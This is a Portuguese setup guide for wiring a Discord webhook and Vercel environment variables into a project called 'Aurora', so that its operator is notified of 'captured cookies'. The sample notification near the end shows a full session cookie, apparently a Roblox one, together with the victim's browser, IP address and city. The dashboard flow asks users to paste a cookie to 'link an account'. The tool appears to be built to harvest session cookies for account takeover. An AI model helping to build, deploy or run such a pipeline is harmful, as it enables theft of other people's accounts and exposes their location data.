# 🔗 Guia Completo - Configuração do Webhook Discord

Este guia mostra exatamente como configurar o webhook do Discord para receber notificações de cookies capturados no Aurora.

## 📋 Pré-requisitos

- ✅ Um servidor Discord (você pode criar um gratuitamente)
- ✅ Permissão de administrador no servidor
- ✅ Acesso ao painel da Vercel

## 🚀 Passo 1: Criar um Webhook no Discord

### 1.1 Abrir Configurações do Servidor

1. Clique com botão direito no nome do seu servidor Discord
2. Selecione **"Configurações do Servidor"** (ou **"Server Settings"**)
3. Na barra lateral esquerda, clique em **"Webhooks"**

### 1.2 Criar um Novo Webhook

1. Clique no botão **"Novo Webhook"** (ou **"New Webhook"**)
2. Escolha um nome para o webhook (ex: "Aurora Bot")
3. Selecione o **canal** onde deseja receber as notificações
4. Clique em **"Criar"** (ou **"Create"**)

### 1.3 Copiar a URL do Webhook

1. Clique em **"Copiar URL do Webhook"** (ou **"Copy Webhook URL"**)
2. A URL será copiada para sua área de transferência

**Exemplo de URL:**
```
https://discord.com/api/webhooks/1234567890123456789/abcdefghijklmnopqrstuvwxyz-1234567890
```

⚠️ **IMPORTANTE:** Esta URL é como uma "chave" para seu webhook. Não compartilhe com ninguém!

## 🔐 Passo 2: Configurar no Arquivo .env (Local)

### 2.1 Criar o arquivo .env

1. Abra o terminal/prompt de comando
2. Navegue até a pasta do projeto Aurora
3. Crie um arquivo chamado `.env` (sem extensão)

### 2.2 Adicionar a URL do Webhook

Abra o arquivo `.env` e adicione:

```env
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/SEU_ID/SEU_TOKEN
```

Substitua `SEU_ID` e `SEU_TOKEN` pela URL que você copiou.

**Exemplo completo:**
```env
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/1234567890123456789/abcdefghijklmnopqrstuvwxyz-1234567890
ADMIN_TOKEN=seu_token_aleatorio_aqui
ALLOWED_ORIGINS=https://aurora.example.com
```

⚠️ **IMPORTANTE:** Nunca commite o arquivo `.env` no Git! Ele já está no `.gitignore`.

## 🌐 Passo 3: Configurar na Vercel (Produção)

### 3.1 Acessar o Painel da Vercel

1. Vá para [https://vercel.com/dashboard](https://vercel.com/dashboard)
2. Selecione seu projeto Aurora
3. Clique em **"Settings"** (Configurações)

### 3.2 Adicionar Variáveis de Ambiente

1. Na barra lateral, clique em **"Environment Variables"**
2. Clique em **"Add New"** (Adicionar Nova)
3. Preencha os campos:
   - **Name:** `DISCORD_WEBHOOK_URL`
   - **Value:** Cole a URL do seu webhook
   - **Environments:** Selecione `Production` (ou todos)
4. Clique em **"Save"** (Salvar)

### 3.3 Adicionar Outras Variáveis

Repita o processo para:

**ADMIN_TOKEN:**
- **Name:** `ADMIN_TOKEN`
- **Value:** Seu token seguro (gerado com `openssl rand -base64 32`)

**ALLOWED_ORIGINS:**
- **Name:** `ALLOWED_ORIGINS`
- **Value:** `https://seu-dominio.com`

### 3.4 Fazer Deploy

1. Após adicionar as variáveis, faça um novo deploy
2. Vá para **"Deployments"**
3. Clique em **"Redeploy"** (Reimplantar) na versão atual

## ✅ Passo 4: Testar o Webhook

### 4.1 Teste Local

```bash
# Instale o projeto
npm install

# Inicie o servidor de desenvolvimento
npm start
```

### 4.2 Teste em Produção

1. Acesse seu site Aurora em produção
2. Vá para o Dashboard
3. Insira um cookie de teste
4. Clique em "Vincular Conta"
5. Verifique se a mensagem aparece no canal Discord

## 🐛 Troubleshooting

### Problema: "Webhook não recebe mensagens"

**Solução 1:** Verificar se a URL está correta
```bash
# Teste a URL com curl
curl -X POST https://discord.com/api/webhooks/ID/TOKEN \
  -H "Content-Type: application/json" \
  -d '{"content":"Teste"}'
```

**Solução 2:** Verificar permissões do bot
- O webhook precisa de permissão para postar mensagens no canal
- Verifique as permissões do canal

**Solução 3:** Verificar se a variável está configurada
- Na Vercel: Settings → Environment Variables
- Verifique se `DISCORD_WEBHOOK_URL` está lá
- Faça um redeploy

### Problema: "Erro 401 Não Autorizado"

- A URL do webhook pode estar expirada
- Crie um novo webhook no Discord
- Atualize a variável na Vercel

### Problema: "Erro 404 Webhook Não Encontrado"

- O webhook pode ter sido deletado
- Crie um novo webhook
- Copie a URL corretamente

## 🔄 Rotacionar o Webhook

Se você acha que o webhook foi comprometido:

1. **Deletar o webhook antigo:**
   - Discord → Configurações do Servidor → Webhooks
   - Clique em "Deletar" no webhook antigo

2. **Criar um novo webhook:**
   - Siga os passos 1.1 a 1.3 acima

3. **Atualizar na Vercel:**
   - Painel Vercel → Settings → Environment Variables
   - Edite `DISCORD_WEBHOOK_URL`
   - Cole a nova URL
   - Faça um redeploy

## 📊 Exemplo de Mensagem Recebida

Quando um cookie é capturado, você receberá uma mensagem como:

```
🔐 NOVA CAPTURA DE COOKIE

🍪 COOKIE COMPLETO
_|WARNING:DO-NOT-SHARE-THIS...

📊 DISPOSITIVO
Tipo: 💻 Desktop/PC
Navegador: Google Chrome
Sistema: Windows

🌍 IP
IP: 192.168.1.1
País: Brasil BR
Região: São Paulo
Cidade: São Paulo

⏰ TIMESTAMP
22 de Maio de 2026 às 14:30:00

🔢 ID DA SESSÃO
abc123def456
```

## 🛡️ Boas Práticas de Segurança

1. **Nunca compartilhe a URL do webhook**
   - Qualquer pessoa com a URL pode enviar mensagens

2. **Use um canal privado**
   - Crie um canal exclusivo para notificações
   - Restrinja o acesso apenas a administradores

3. **Rotacione regularmente**
   - A cada 3 meses, crie um novo webhook
   - Delete o webhook antigo

4. **Monitore as mensagens**
   - Verifique regularmente se há atividades suspeitas
   - Se notar algo estranho, rotacione imediatamente

5. **Use variáveis de ambiente**
   - Nunca coloque a URL no código
   - Use `.env` para desenvolvimento
   - Use Vercel Environment Variables para produção

## 📞 Suporte

Se tiver problemas:

1. Verifique este guia novamente
2. Consulte a documentação do Discord: https://discord.com/developers/docs/resources/webhook
3. Abra uma issue no repositório

---

**Última atualização:** 22 de Maio de 2026

**Versão:** 1.0
